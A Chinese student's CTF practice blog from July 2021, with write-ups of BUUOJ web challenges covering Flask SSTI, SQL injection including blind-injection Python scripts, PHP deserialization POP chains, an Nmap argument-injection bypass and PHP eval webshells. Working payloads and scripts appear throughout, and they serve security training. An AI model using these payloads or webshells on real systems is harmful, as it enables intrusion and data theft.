---
title: 21年7月练题记录(大二第三学期)
date: 2021-07-15 21:42:30
author: Na0H
headimg: /img/atimg/19.jpg
tags:	
- ctf
categories:
- ctf
excerpt: ctf练题记录，这玩意还是要练的，之前做过的居然也忘了很多，一边练题一边打比赛吧
description: ctf练题记录，这玩意还是要练的，之前做过的居然也忘了很多，一边练题一边打比赛吧

---

<!-- more -->

## 2021.7.15

前言：今天决定还是写到博客里0-0，放word一方面记得不认真，一些代码啥的也不方便整，希望能坚持住

### [WesternCTF2018]shrine——ssti(bypass config)

题目源码整理后如下：

```python
import flask		# flask模板，看到就猜测是ssti了
import os 

app = flask.Flask(__name__) 
app.config['FLAG'] = os.environ.pop('FLAG') 	#注册了一个名为FLAG的config，flag应该就在这啦
@app.route('/') 

def index(): 
    return open(__file__).read() 

@app.route('/shrine/') 	#设置路由shrine，应该是通过url/shrine/{{ssti代码}}执行ssti

def shrine(shrine): 
    def safe_jinja(s): 
        s = s.replace('(', '').replace(')', '') 
        blacklist = ['config', 'self'] 
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s 	# 把黑名单balcklist里的东西遍历，并设置为空（也就是ssti调用黑名单里的时候就会为空）

    return flask.render_template_string(safe_jinja(shrine)) 	# 渲染模块

if __name__ == '__main__': 
    app.run(debug=True)
```

测试ssti:

```
url/shrine/{{7*7}}
```

![](https://i.loli.net/2021/07/15/xiPrFJYpwMsoVS6.png)

​	上面分析看到`app.config['FLAG'] = os.environ.pop('FLAG')` 	注册了一个名为FLAG的config，正常的话使用{{config}}就可以看到app.config的所有内容了
​	但是在后面的黑名单里`['config','self']`过滤了,并且`s.replace('(', '').replace(')', '')`将括号置换为空（那么正常流程如`{{[].class.bases[0].subclasses()}}`就用不了了）
也就是考点所在

​	知识点：利用python的内置函数：如`url_for`和`get_flashed_messages`

```
url/shrine/{{url_for.__globals__}} 
```

![](https://i.loli.net/2021/07/15/ouQYIBxthLEJAHk.png)

在源码里定义的是app.config，搜索一下可以看到右上角第二行有个current_app，调用一下其下的config

```
url/shrine/{{url_for.__globals__['current_app'].config}}
或者是 url/shrine/{{get_flashed_messages.__globals__['current_app'].config}}
```

![得到flag啦](https://i.loli.net/2021/07/15/ox4mcfGqSdD968C.png)



### [SWPU2019]Web1——sql注入

注册-登录-只看到个申请发布广告，要么在注册、登录框，要么就在这个申请发布广告里啦，先进来看看吧

![](https://i.loli.net/2021/07/15/EyacuifPH6SwxFX.png)

一开始还以为是xss的--内容部分也确实可以写xss,但一直没反应；后面随便测试的时候输了一下123'啥的，点击广告详情就看到sql语句报错
![](https://i.loli.net/2021/07/15/6GiXQlIV7sRDNqr.png)
	经过尝试发现是在广告名处存在二次注入，也就是说sql语句是已经被存储的，再次读取时才会进入sql查询语句中。此处我们填写广告申请的时候没有出现sql注入，而当我们发布完毕，再次点击查看广告详情的时候就造成二次注入。

​	fuzz一下发现过滤了`注释符`、`空格`、`or`以及`order`等一些关键词，空格可以用/**/绕过；or可以用异或或者换一种注入手法；order这些关键词被ban那一些查询语句就不行了，得找替代；不需要注释符其实也没事，只需要保证语句的正常返回即可

​	那么来构造一下语句，继续单引号，因为注释符被ban，再加一个单引号进行闭合（/**/绕过空格过滤）：

```
1'/**/union/**/select/**/1,2,3/**/'
```

![](https://i.loli.net/2021/07/15/gWJHnIsr3QFyvLB.png)

可以看到报错字段数目不对，一直测试就行，测试到22就ok

```
1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'
```

![](https://i.loli.net/2021/07/15/ukAlo1GfPZ3U8qh.png)

但是information被ban了，保存的时候就发现这题是用的MariaDB(mysql>5.5的默认存储引擎也是innodb)，可以用mysql.innodb_table_stats，
但接触到了还是顺便学习一下![](https://i.loli.net/2021/07/15/ONiQM2w31mPEUHe.png)

#### 知识点1：bypass information_schema

之前看过相关的文章，回去学习一下：[聊聊bypass information schema-安全客](https://www.anquanke.com/post/id/193512#h2-3)

1、利用innoDB引擎绕过：[对两道CTF题目的研究 - Von的博客](https://www.v0n.top/2019/11/15/对两道CTF题目的解析/)，但mysql是默认关闭InnoDB引擎的

2、mysql默认情况下可以替代information_schema的方法：（要求mysql≥5.7且有超级管理员才能访问sys）
	1) `schema_auto_increment_columns`，对**自增id**起到监控作用
	（经过上文博主实验，发现除了本库的非自增id表不出现在本表，本库以及其他库的表都出现）

​	2) `schema_table_statistics_with_buffer`**对于没有自增主键的表**,查询表的统计信息，其中还包括InnoDB缓冲池统计信息(实践发现schema_auto_increment_columns中没出现的表都出现啦)

payload：

```sql
schema_auto_increment_columns 
?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+
```

```sql
schema_table_statistics_with_buffer 
?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+
```

这里想试一下这两种，但传payload发现一直卡着不动，maraiaDB根本没这表，决定去看一下各类wp
发现还有如下方法，不过还是回头用InnoDB了

![](https://i.loli.net/2021/07/15/375XByie4PrKqHO.png)

```
回头去使用innodb，而且我发现必须利用子查询才能返回，，不然就会卡住（不懂为啥）
1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'
```

![](https://i.loli.net/2021/07/15/aqPgDnAIUzCk4c8.png)

得到表名FLAG_TABLE,但是mysql.innodb_table_stats只包含数据库名和表名，因此要利用到无列名注入了（说起来国赛唯一做的那题也是无列名注入呢--）

```
1'/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/mysql.innodb_table_stats/**/where/**/table_name=FLAG_TABLE),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'
```

#### 知识点2：无列名注入

**基础定义**：适用于知道表名而无法查询列的情况，原理类似于为不知道的列取别名，在命名别名同时进行数据查询（因此要求查询字段数=数据表中的列的数目，也是联合查询的特性）

**一些特点**：可以利用反引号**`**包裹数字来对应列：如

```
# `3`对应第三列，这里没有别名会报错所以加了as a
select `3` from (select 1,2,3 union select * from users) as a;
```

![](https://i.loli.net/2021/07/15/Fi6jdWOxfmJ1t3E.png)

如果反引号被过滤就使用字符：

```
# 直接在末尾加任意字符也等于取别名
select b from (select 1,2,3 as b,4,5 union select * from users)a;
```



那么构造payload,一开始查FLAG_TABLE说没有这个表，后面都查了一下发现除了users可以其他都显示不存在该表

```
1'/**/union/**/select/**/1,(select/**/group_concat(hh)/**/from/**/(select/**/1,2,3/**/as/**/hh/**/union/**/select/**/*/**/from/**/gtid_slave_pos)xixi),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'
```



## 2021.7.16

前言:今天跑去搞马原实践，太阳又毒又辣，回来吃麦当劳送杯子哈哈哈，其实是为了杯子去吃的，回来直接躺下睡大觉了，起来洗完澡已经是8点，配环境又搞了1个半小，差点emo了

### [BJDCTF2020]Mark loves——git源码泄漏、$$变量覆盖

得到一个前端页面，目录扫描，git源码泄漏拿到源码
(wp居然看不懂。。。自己分析--)

flag.php:

```php
<?php
$flag = file_get_contents('/flag');
```

index.php

```php
<?php
include 'flag.php';
$yds = "dog";
$is = "cat";
$handsome = 'yds';

# foreach post和get：传参的参数键名 => 参数值
foreach($_POST as $x => $y){
    $$x = $y;	# 传入hhh=123,代入得到$hhh=123;
}

foreach($_GET as $x => $y){
    $$x = $$y;	# 传入hhh=123,代入得$hhh=$123;而传入$hhh=$123则$$hhh=$$123得到这里明显是变量覆盖
}

foreach($_GET as $x => $y){	#get的参数flag的值=键名$x，且键名$x能存在flag 则->$$handsome
    if($_GET['flag'] === $x && $x !== 'flag'){	
        exit($handsome); # yds
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){ # 不存在get和post参数flag 则->$yds
    exit($yds); # dog
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){ # post或get的flag参数的值为flag 则->$is
    exit($is); # cat
}

echo "the flag is: ".$flag;
```

那么要想获得flag，方法有2：
1、不能让$flag被重置，并需满足3个条件中的任意一个，使得对应的返回值$xx=$flag
2、绕过所有判断条件，让其输出$flag

#### 方法1：符合条件输出flag

对照传参变量进行分析

`POST	a=b:    $a = b	`
`GET     ?a=b:	$a = $b   `

先来分析法1的三个判断条件：

```php
# 1、需要flag参数的值为某键名，且改键名的值不为flag
# 满足该条件并讲输出参数赋值为flag即可：?handsome=flag&Na0H=flag&flag=Na0H
if($_GET['flag'] === $x && $x !== 'flag')	
# 2、get和post都不能传入flag值
# 很容易满足，直接get传入?yds=flag即可
if(!isset($_GET['flag']) && !isset($_POST['flag']))
# 3、为满足条件必须用get传参flag=flag => $flag=$flag才不会覆盖$flag原值
# 此时传入is=flag => $is=$flag即可使其输出$is为$flag的值
if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag')
```

如下：

![?handsome=flag&Na0H=flag&flag=Na0H](https://i.loli.net/2021/07/16/CrmglBu9o4eysGc.png)

![?yds=flag](https://i.loli.net/2021/07/16/pNRXd6Zr1Uhq83L.png)

![?is=flag&flag=flag](https://i.loli.net/2021/07/16/2e6slyj9GEnmiag.png)

#### 方法2：绕过判断输出flag

三个判断条件即：不能循环赋值，如`is=flag&flag=is`GET和POST至少有一个传入flag参数，且flag参数的值不能为flag

但这个没想出来-==有没有可行性也没确定，懂的师傅还请不吝赐教哈哈



### [网鼎杯 2020 朱雀组]Nmap

一个大大的Nmap，提示只能扫127，妥妥的命令执行了，后端应该是调用nmap的扫描语句，然后一开始想可能是利用Nmap的一些特殊参数，如下

```
-iL	  读取主机列表：eg：“-iL C:\ip.txt”
-o	  输出到xx，如 -o 123.txt
```

​	但是直接使用的话 如`127.0.0.1 -iL /flag -o 1`是失败的。尝试一下构造闭合（想写shell发现php被过滤了）
​	可以在最前面加一个单引号构造一个闭合：`127.0.0.1' -iL /flag -o hhh.txt'`；然后访问`hhh.txt`就行

看wp讲可以利用[PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org)](https://paper.seebug.org/164/)

![](https://i.loli.net/2021/07/16/ejALvfW6SUzXb9s.png)考点和之前做的Online tool一样，就是过滤了php，换成短标签和phtml就可以写shell啦
payload：`127.0.0.1' <?= @eval($_POST["hhh"]);?> -oG 2333.phtml '`![](C:\Users\11634\AppData\Roaming\Typora\typora-user-images\image-20210717000531752.png)



## 2021.7.18

昨天培训回来就十点半了，没刷题跑去打游戏了。。今天睡一觉 ，做了一下作业又大半天诶呀呀

### [网鼎杯 2020 朱雀组]phpweb——反序列化

进去就是这玩意![](https://i.loli.net/2021/07/18/8BOSreLj6asK2Dv.png)

不懂是什么梗，但好像会不断刷新，似乎是调用了data()来显示时间

抓个包可以看到post传参：func为函数名，p为函数的参数值：![](https://i.loli.net/2021/07/18/4lkW6mDvCHutg1L.png)

经过测试知道用的是call_user_func()，而传入phpinfo回显Hacker，看来是存在过滤，过滤了很多命令执行参数，可以用一下hightlight_file或者file_get_content来获取index.php源码![](https://i.loli.net/2021/07/18/caOHrZtiB82dlPj.png)

php部分：

```php
    <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {	# 判断call_user_func的返回值是否为字符串类型，是则输出，否则输出空
            return $result;
        } else {return "";}
    }
    class Test {	# 就是图中的测试样例
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);	# 将传入的func值转为小写
        if (!in_array($func,$disable_fun)) {	# 函数名不在黑名单才可返回结果
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

之所以会自动传参data(Y-m-d h:i:s a)是因为写了个隐含的post传输，而不是调用定义的Test类，之前我还疑惑来着，还好回去看了html部分的代码![](https://i.loli.net/2021/07/18/e6Zjto1QRmq93MA.png)

再回头看着黑名单这一长串，正常传有点困难，发现定义了个Test类，而且没有禁用unserialize()，那么这里就可以尝试传入反序列化，当传入的对象被销毁的时候就会调用Test类里的__destruct()方法，输出gettime($this->func, $this->p);的结果从而绕过黑名单
那么构造一下payload：

```php
<?php

class Test {
        var $p = "ls /";
        var $func = "system";
    }

echo urlencode(serialize(new Test())); # 这里因为是普通的var，用不用urlencode都行，个人习惯
```

```z
传入：
func=unserialize&p=生成的序列化数据
```

成功执行命令，那么就是找flag啦![](https://i.loli.net/2021/07/18/7PY94vZug8KWoaM.png)

（根目录没看见flag，本来说想尝试下写shell的，但是看了一下权限是普通的www-date，还是老老实实find了）
最终payload：
![](https://i.loli.net/2021/07/18/ApezJG5iv1aMbPF.png)

![](https://i.loli.net/2021/07/18/ERyYKaVMIZ7zrJm.png)



### [极客大挑战 2019]FinalSQL——脚本bool盲注

可以看到第一行就提示sql盲注00，那么就是找注入点写脚本了![](https://i.loli.net/2021/07/18/HtFQ5xLupbDWIiv.png)点这几个小方块，根据提示找到url/search.php?id=6![](https://i.loli.net/2021/07/18/AZUNctB4u6TMGYL.png)

过滤了绝大部分东西，试了一下异或1^1 和 1^0，可以发现回显的不一样，可以尝试bool注入
后面构造payload

```mysql
# 数据库 (geek)
1^(ascii(substr(database(),%d,1))>%d)^1

# 爆表 (F1naI1y,Flaaaaag )
1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)^1

# 爆字段 (id,username,password)
1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)^1

# 爆flag之username（mygod,welcome,site,site,site,site,Syc,finally,flag）
1^(ascii(substr((select(group_concat(username))from(F1naI1y)),%d,1))>%d)^1

# 爆flag（限定为username为flag然后爆破）
1^(ascii(substr((select(password)from(F1naI1y)where(username='flag')),%d,1))>%d)^1

```

写个脚本(找个二分法脚本+上payload嘻嘻)

```python
import time
import requests
# 这里没有requests.get的data参数，我一用就报错--，可能是我格式问题，就直接url?id=了
url = "http://24a3f947-2d35-4077-80f1-6dd9d794bb8f.node4.buuoj.cn/search.php?id="
flag = ""
i = 0
while True:
    i += 1
    low = 32
    high = 128
    mid = (low + high) // 2
    while low < high:
        print(low, high, mid)
        time.sleep(0.1)

        # 数据库 (geek)
        # payload = "1^(ascii(substr(database(),%d,1))>%d)^1" % (i, mid)
        
        # 爆表 (F1naI1y,Flaaaaag)
        # payload = "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)^1" % (i, mid)
        
        # 爆字段 (id,username,password)
        # payload = "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)^1" % (i, mid)
        
        # 爆flag之username（mygod,welcome,site,site,site,site,Syc,finally,flag）
        payload = "1^(ascii(substr((select(group_concat(username))from(F1naI1y)),%d,1))>%d)^1" % (i, mid)
       
        # 爆flag（限定为username为flag然后爆破）
        # payload = "1^(ascii(substr((select(password)from(F1naI1y)where(username='flag')),%d,1))>%d)^1" % (i, mid)
        
        r = requests.get(url+payload)
        if 'Click' in r.text:
            low = mid + 1
            mid = (low + high) // 2
        else:
            high = mid
            mid = (low + high) // 2

    flag += chr(mid)
    print(flag)
    if low == 32:
        break
```



## 2021.7.19

今天被林会抓来了好吧，其实宿舍816都差不多，就是路上也太热了，而且电脑搬来搬去也麻烦

### [MRCTF2020]Ezpop——反序列化构造pop链

直接上代码

```php
Welcome to index.php
<?php
//flag is in flag.php
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){	# a.调用对象为函数时触发，能实现文件包含(伪协议)读取flag.php
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){	# c.将类当作字符串使用时触发
        return $this->str->source;
    }

    public function __wakeup(){	# d.若source为类，这里会将其当作字符串处理从而触发tostring
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
	# b.这里通过调用不存在的属性读取数据来触发__get()，其返回值会调用函数，从而触发modifier的invoke()
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

理一下思路
一开始是找能获得flag的地方：`Modifier()`的`__invoke()`可以实现文件包含
再找能触发`__invoke`的地方：`Test`类的`__get()`会以函数形式调用$p，也就触发了__invoke()
再找能触发`__get`的地方：`Show`类的`__tostring`访问`$str`的`$source`属性，如果str不存在该属性就会触发`__get`
再找能触发`__tostring`的地方：`Show`类的`__wakeup`会调用preg_match()进行正则匹配，也就将$source当作字符串处理，如果给source赋值为类的话就会触发`__tostring`

那么咱们pop链就是：`Show类__wakeup() -> Show类__tostring() -> Test类__get() ->Modifier类__invoke()`

构造payload

```php
# 这里先序列化实例化的Show($a)从而调用__wakeup,$a就会被赋值给source
# 而$a作为一个实例化的Show类，被当作字符串处理就触发_tostring()
# 再令$a->str=Test(),而Test()中不存在source属性，就会触发_get()
# $a->str->p=Modifier()，触发_get()后，会返回 $p();即将Modifier当作函数调用，从而触发其中的__invoke()，最终获得flag
<?php
highlight_file(__FILE__);

class Modifier {	# include()的部分，利用伪协议读取flag.php
    protected  $var = "php://filter/convert.base64-encode/resource=flag.php";
}

class Show{		# source
    public $source;
    public $str;
    public function __construct($file){
        $this->source = $file;
        $this->str = new Test();
    }

}

class Test{	
    public $p;
    public function __construct(){
        $this->p = new Modifier();
    }
}

$a = new show('hhh');
echo urlencode(serialize(new Show($a)));
```

```php
payload：
O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";s:3:"hhh";s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"*var";s:52:"php://filter/convert.base64-encode/resource=flag.php";}}}s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"*var";s:52:"php://filter/convert.base64-encode/resource=flag.php";}}}

url编码后：O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22hhh%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D
```

![](https://i.loli.net/2021/07/19/PrDmcpFaOhlXvR1.png)



### [CISCN2019 华北赛区 Day2 Web1]Hack World ——脚本bool盲注

随便输入数字，发现1和2回显不同，而其他数字都会报ERROR；
fuzz一下发现过滤了很多，字典网上找的不是很准确，看了一下源码真实过滤如下：

```php
array(' ','||','#','-',';','&','+','or','and','`','"','insert','group',
'limit','update','delete','*','into','union','load_file','outfile','./')
```

![](https://i.loli.net/2021/07/19/YmJgvyrTxbUHwVd.png)

尝试异或运算：`1^1^1`，发现可以得到正常结果，可以判断是数字型bool盲注，感觉和昨天做的那题类似ya，跑一下脚本
因为1和2回显不同可以，可以用if语句：`if(注入语句,1,2)`也就是正确则返回下图1的结果，错误则返回下图2的结果
其实只要定义正确时候的返回值就可以了，主要目的还是区分bool(True/False)
![](https://i.loli.net/2021/07/19/ycOUW6SwQplD1eK.png)

构造payload：（我z啊，整了好久没懂为啥爆不出表名，因为information被ban会爆sql injection
我就尝试了别的库，本地测试是正常的，但这次又爆bool(False)）
先放脚本吧，也调了好多次，问题出在二分法--

```python
# 数据库
# payload = "if((ascii(substr(database(),%d,1))>%d),1,2)" % (i, mid)

# flag
# payload = "if((ascii(substr((select(flag)from(flag)),%d,1))>%d),1,2)" % (i, mid)

# 错误的表名payload
# payload = "if((ascii(substr((select(concat(table_name))from(mysql.innodb_table_stats)where(table_schema=database())),%d,1))>%d),1,2)" % (i, mid)
```

```python
import time
import requests

url = "http://510b48fa-9df7-449a-92c5-3f9f944969d1.node4.buuoj.cn/index.php"
flag = ""
i = 0
while True:
    i += 1
    low = 32
    high = 128
    mid = (low + high) // 2
    while low < high:
        # print(low, high, mid)
        payload = "if((ascii(substr((select(flag)from(flag)),%d,1))>%d),1,2)" % (i, mid)
        r = requests.post(url, data={"id": payload})
        time.sleep(0.01)

        if 'glzjin' in r.text:
            low = mid + 1
            mid = (low + high) // 2
        else:
            high = mid
            mid = (low + high) // 2

    flag += chr(mid)
    print(flag)
    if low == 32:
        break
```

## 2021.7.20

### [0CTF 2016]piapiapia

给了登录框，一边扫描一边尝试一下sql注入
其实碰到这种登录框可以先尝试这几种方向：sql注入，注册登录（register.php啥的，本题也有），源码泄漏

扫到www.zip；看了一下几个php文件，全局class+config，其他文件进行调用class。
而register和index实现注册登录功能，class和config是关于数据库的交互和配置
（在config.php有变量$flag）

这里用一下咱的seay源代码审计系统：
![image.png](https://i.loli.net/2021/07/20/w7rAJfYIEjxc6os.png)

跟着定位看一下profie和update

```php
# profile.php，个人资料页面
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	$username = $_SESSION['username'];
	$profile=$user->show_profile($username); 	
	# 根据登录用户名执行show_profile()得到序列化的$profile
	
	# 看一下class.php中的show_profile()
    #  public function show_profile($username) {
	#
    #     $username = parent::filter($username); 
    #     # 调用父类mysql的filter进行过滤
    #     $where = "username = '$username'";
	#
    #     # 拼接成SQL参数，调用mysql类中的select函数，并将数组形式的结果中的profile键取出作返回值
    #     $object = parent::select($this->table, $where);
    #     return $object->profile;
    # }

	if($profile  == null) {
		header('Location: update.php');
	}
	else {
		$profile = unserialize($profile);	# 反序列化$profile变回数组形式
		$phone = $profile['phone'];			# 根据反序列化得到的数组进行赋值
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo']));	
		# 这里profile的photo会被file_get_contents读取并进行base编码输出
?>
```

```php
# update.php，该页面可以修改用户的phone,email,nickname和photo
# 传入的四个参数会在过滤后赋给$profile进行序列化
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}

# post传参、过滤
	if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {

		$username = $_SESSION['username'];
		if(!preg_match('/^\d{11}$/', $_POST['phone']))
			die('Invalid phone');

		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
			die('Invalid email');
		
		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
			die('Invalid nickname');

		$file = $_FILES['photo'];
		if($file['size'] < 5 or $file['size'] > 1000000)
			die('Photo size error');

		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
		$profile['phone'] = $_POST['phone'];
		$profile['email'] = $_POST['email'];
		$profile['nickname'] = $_POST['nickname'];
		$profile['photo'] = 'upload/' . md5($file['name']);

		$user->update_profile($username, serialize($profile));	# 就是在这里将$profile序列化
		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';      
	}
	else {
?>
```

可以看到update.php传入的四个变量中nickname可以通过传入数组来让preg_match()为flase，并且绕过strlen的长度判断，从而进行绕过

```php
# 再看class.php中的uoload_profile()
	public function update_profile($username, $new_profile) {
		$username = parent::filter($username);
		$new_profile = parent::filter($new_profile);

		$where = "username = '$username'";
		return parent::update($this->table, 'profile', $new_profile, $where);
	}
# 然后再找mysql类的update和filter方法，进行数据更新和过滤
	public function update($table, $key, $value, $where) {
		$sql = "UPDATE $table SET $key = '$value' WHERE $where";
		return mysql_query($sql);
	}
	
	public function filter($string) {
		$escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';	# 将黑名单中的escape(/'|\\/) 替换为 _
		$string = preg_replace($escape, '_', $string);	

		$safe = array('select', 'insert', 'update', 'delete', 'where');# 将黑名单safe替换为hacker
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);
	}
```

看到这里的过滤规则：会将长度为5/6的黑名单关键字替换为长度为6的hacker，想到反序列化逃逸
利用点找的差不多了，理一下思路：
update页面传入的数据会经过正则匹配过滤后序列化，再将符合黑名单的关键词替换为hacker
到profile.php页面会将$profile反序列化,，将$profile[photo]包含再转base64输出

这里想要获得flag就要使得photo=config.php，但photo不可控

可以利用反序列化逃逸，传入长度为5的where被替换为hacker，长度+1，算一下需要传入的序列化数据的长度从而构造payload替换原有photo序列

![](https://i.loli.net/2021/07/20/hmfynsMd2qaGJ4c.png)

要替换的长度为`34`：`";}s:5:"photo";s:10:"config.php";}`
那么 `nickname[]=34个where+";}s:5:"photo";s:10:"config.php";}`即

```php
wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
```

注册登录，update.php修改传参

![](https://i.loli.net/2021/07/20/eq7wy4lbxcGrsEA.png)

访问profile.php，base64解码图像信息即可得到flag

![](https://i.loli.net/2021/07/20/BLgysDzGOoqWhPF.png)

### [RoarCTF 2019]Easy Java

本来说学多线程的，但是没睡午觉太困了，，随便做个简单的java题
点一下help出来个：`java.io.FileNotFoundException:{help.docx}`

好像是找不到文件的意思，看这个id可能是任意文件下载，但这里提示找不到文件，看wp![](https://i.loli.net/2021/07/20/P3xMieG6tmsvNj8.png)

看了一下wp，改成post请求就可以了

![](https://i.loli.net/2021/07/20/UaMZsx3z8v79yYi.png)

但是对java并不了解--不过之前倒是做过一体类似的，也大致了解一点点

> WEB-INF主要包含一下文件或目录:
> /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
> /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
> /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
> /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
> /WEB-INF/database.properties：数据库配置文件

先拿web.xml，然后可以得知flag的class文件路径：![](https://i.loli.net/2021/07/20/WogbFEYDdVS9zr8.png)
访问路径，然后base64即可![](https://i.loli.net/2021/07/20/PXxAnjHZup431CN.png)



![](https://i.loli.net/2021/07/20/JhcYnypOUoNXCm1.png)![](https://i.loli.net/2021/07/20/Hny2KFWzs1vCDAU.png)



## 2021.7.21

### [MRCTF2020]PYWebsite ——xff

要求输入授权码，可以F12查看一下源码，看逻辑是md5授权码匹配则跳转到flag.php，所以可以直接访问flag.php![](https://i.loli.net/2021/07/21/k4Lh75xtJf1yrBw.png)

但还是好奇能不能解，结果如下：

![](https://i.loli.net/2021/07/21/WJwPGHeIV1Ej2tO.png)

flag.php页面![](https://i.loli.net/2021/07/21/xqL9Fghale6jO8B.png)

说购买者的IP都被他保存了，也就是说会检测我们的IP，尝试一下修改XFF为127.0.0.1让他检测自身
得到flag
![](https://i.loli.net/2021/07/21/7rD3p4bg2UlEXB5.png)

### [NPUCTF2020]ReadlezPHP ——反序列化

一开始的页面没啥，最下面有个报时，viwe-source:url看一下源码，看到报时那有个url：
`<p>百万前端的NPU报时中心为您报时：<a href="./time.php?source"></a></p>`

```php
# 访问一下
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);	# 反序列化

# HelloPhp类echo date(Y-m-d h:i:s)输出的结果：2021-07-21 12:38:57
```

那么构造payload吧：

```php
<?php
highlight_file(__FILE__);

class HelloPhp
{
    # public $a = "phpinfo()";
    public $a = 'eval($_POST[hhh]);';
    public $b = 'assert';	# assert($assertion)，$assertion是字符串就会被assert()当做PHP代码执行
}

echo serialize(new HelloPhp());
```

先执行phpinfo()看看disable_function禁用了哪些函数
![](https://i.loli.net/2021/07/21/8WLzFvknMaBZNE1.png)

传马：

```php
O:8:"HelloPhp":2:{s:1:"a";s:18:"eval($_POST[hhh]);";s:1:"b";s:6:"assert";}
```

![](https://i.loli.net/2021/07/21/oTmZseJdSXljEUL.png)

不过命令执行函数被ban了一堆，但是我们可以尝试用伪协议：`var_dump(scandir('glob:///*'));`罗列文件名![](https://i.loli.net/2021/07/21/KIcLt2E7szXHQ6g.png)

